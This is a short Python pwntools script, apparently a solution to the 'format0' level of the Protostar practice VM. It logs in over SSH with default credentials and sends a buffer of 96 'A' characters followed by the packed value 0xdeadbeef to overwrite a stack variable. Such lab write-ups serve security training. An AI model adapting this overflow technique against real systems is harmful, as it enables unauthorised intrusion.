from pwn import *
import os

ip = os.getenv("PROTOSTAR")
shell = ssh('user', ip, password='user')
sh = shell.run("sh")
sh.sendline("cd /opt/protostar/bin/")

exploit = "A"*96 + p32(0xdeadbeef)

sh.sendline("./format0 " + exploit)
print sh.recvline()